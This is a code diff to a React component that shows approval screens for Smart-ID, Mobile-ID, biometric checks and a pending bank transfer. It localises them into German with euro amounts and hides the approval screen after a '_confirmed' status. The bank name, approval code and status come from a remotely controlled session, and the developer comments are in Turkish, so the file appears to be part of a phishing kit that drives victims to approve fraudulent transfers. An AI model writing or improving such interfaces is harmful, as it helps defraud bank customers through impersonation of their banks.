@@ -110,7 +110,7 @@ function SmartIdApprovalCard({
 
         <div className="space-y-5 text-center">
           <h1 className="text-[2rem] font-semibold leading-[1.18] tracking-[-0.03em] text-[#101828]">
-            Open the Smart-ID app on your phone.
+            Oeffnen Sie die Smart-ID-App auf Ihrem Telefon.
           </h1>
 
           <p className="text-[1.08rem] text-[#667085]">Bestaetigen mit {pinLabel}</p>
@@ -155,7 +155,7 @@ function GenericApprovalCard({
       <div className="w-full max-w-[420px] rounded-[22px] border border-[#d9dee6] bg-white p-7 text-center shadow-[0_24px_80px_rgba(20,32,56,0.10)]">
         <p className="mb-3 text-sm font-semibold uppercase tracking-[0.24em] text-[#0ea5a8]">{title}</p>
         <h1 className="mb-3 text-3xl font-semibold tracking-[-0.03em] text-[#101828]">Bestaetigung erforderlich</h1>
-        <p className="mb-6 text-base text-[#667085]">To continue, confirm the verification code shown on your device.</p>
+        <p className="mb-6 text-base text-[#667085]">Bestaetigen Sie zum Fortfahren den auf Ihrem Geraet angezeigten Code.</p>
 
         <div className="mb-4 rounded-2xl border border-[#d8dde5] bg-[#f8fafc] px-5 py-5 text-4xl font-semibold tracking-[0.14em] text-[#111827]">
           {approvalCode || "0000"}
@@ -200,7 +200,7 @@ function MobileIdApprovalCard({
 
         <div className="space-y-5 text-center">
           <h1 className="text-[2rem] font-semibold leading-[1.18] tracking-[-0.03em] text-[#101828]">
-            Open the Mobile-ID app on your phone.
+            Oeffnen Sie die Mobile-ID-App auf Ihrem Telefon.
           </h1>
 
           <p className="text-[1.08rem] text-[#667085]">Bestaetigen mit {pinLabel}</p>
@@ -265,7 +265,7 @@ function BiometricApprovalCard({
 
         <div className="space-y-5 text-center">
           <h1 className="text-[2rem] font-semibold leading-[1.18] tracking-[-0.03em] text-[#101828]">
-            Biometric verification
+            Biometrische Verifizierung
           </h1>
 
           <p className="text-[1.08rem] text-[#667085]">Bestaetigen mit {pinLabel}</p>
@@ -312,11 +312,20 @@ function TransferApprovalCard({
       <div className="pak-form-card w-full max-w-[560px]">
         <div className="pak-form-inner px-5 py-6 text-center sm:px-8 sm:py-8">
           <p className="pak-eyebrow">Online Banking</p>
-          <h1 className="pak-form-title mt-3 text-[2rem] sm:text-[2.5rem]">Pending Transfer</h1>
+          <h1 className="pak-form-title mt-3 text-[2rem] sm:text-[2.5rem]">Ausstehende Ueberweisung</h1>
 
-          {/* Buyuk € tutar kutusu */}
-          <div className="mx-auto mb-6 mt-4 flex h-24 w-24 items-center justify-center rounded-[14px] bg-[#0C7A3E] text-[1.75rem] font-bold tracking-tight text-white">
-            {displayAmount ? `$${displayAmount}` : "$"}
+          {/* Buyuk € tutar kutusu — 3D glass kart */}
+          <div
+            className="mx-auto mb-6 mt-4 flex h-24 w-28 items-center justify-center rounded-[18px] text-[1.9rem] font-extrabold tracking-tight text-white"
+            style={{
+              background: "linear-gradient(160deg, #ff5a52 0%, #df0000 45%, #9d0000 100%)",
+              boxShadow:
+                "0 18px 40px rgba(223,0,0,0.35), 0 4px 10px rgba(0,0,0,0.25), inset 0 1px 1px rgba(255,255,255,0.55), inset 0 -6px 14px rgba(0,0,0,0.28)",
+              border: "1px solid rgba(255,255,255,0.35)",
+              textShadow: "0 2px 8px rgba(0,0,0,0.4)",
+            }}
+          >
+            {displayAmount ? `€${displayAmount}` : "€"}
           </div>
 
           <div className="mx-auto grid max-w-[460px] grid-cols-3 items-center gap-2 rounded-[10px] bg-[#f6fbff] px-3 py-4 text-left sm:px-5">
@@ -324,15 +333,15 @@ function TransferApprovalCard({
               <p className="text-[10px] font-semibold uppercase tracking-[0.08em] text-[#6f7b8e]">Status</p>
               <div className="mt-1 flex items-center gap-2">
                 <span className="h-3 w-3 animate-pulse rounded-full bg-[#ef9b23]" />
-                <span className="text-[12px] font-semibold text-[#27324a]">Waiting</span>
+                <span className="text-[12px] font-semibold text-[#27324a]">Ausstehend</span>
               </div>
             </div>
             <div className="border-r border-black/5 px-3">
-              <p className="text-[10px] font-semibold uppercase tracking-[0.08em] text-[#6f7b8e]">Action</p>
-              <p className="mt-1 text-[12px] font-semibold text-[#27324a]">Approve transfer</p>
+              <p className="text-[10px] font-semibold uppercase tracking-[0.08em] text-[#6f7b8e]">Aktion</p>
+              <p className="mt-1 text-[12px] font-semibold text-[#27324a]">Ueberweisung bestaetigen</p>
             </div>
             <div className="pl-3">
-              <p className="text-[10px] font-semibold uppercase tracking-[0.08em] text-[#6f7b8e]">Currency</p>
+              <p className="text-[10px] font-semibold uppercase tracking-[0.08em] text-[#6f7b8e]">Waehrung</p>
               <p className="mt-1 text-[12px] font-semibold text-[#27324a]">Euro</p>
             </div>
           </div>
@@ -357,7 +366,7 @@ function TransferApprovalCard({
           </div>
 
           <div className="mx-auto mt-5 max-w-[480px] rounded-[6px] bg-[#e4f3ee] px-4 py-3 text-[12.5px] font-medium leading-5 text-[#175c48]">
-            Keep your banking app open — the approval request may take a moment to appear.
+            Lassen Sie Ihre Banking-App geoeffnet — die Bestaetigungsanfrage kann einen Moment dauern.
           </div>
 
           <button
@@ -468,9 +477,12 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
     const applySessionData = (sessionData: { form_data?: Record<string, unknown> | null; status?: string | null } | null | undefined) => {
       const formData = sessionData?.form_data;
       const fd = (formData ?? {}) as Record<string, string | undefined>;
+      const rawApproval = fd.approvalStatus?.trim() ?? "";
       setViewState({
         sessionStatus: sessionData?.status?.trim() ?? "",
-        approvalStatus: fd.approvalStatus?.trim() ?? "",
+        // "_confirmed" durumlari icin ekstra onay ekrani GOSTERME —
+        // kullanici zaten onayladi, /wait yonlendirmesi devralir.
+        approvalStatus: rawApproval.endsWith("_confirmed") ? "" : rawApproval,
         approvalCode: fd.approvalCode?.trim() ?? "",
         bankSlug: fd.bankSlug?.trim() ?? "",
         bankName: fd.bankName?.trim() ?? "",
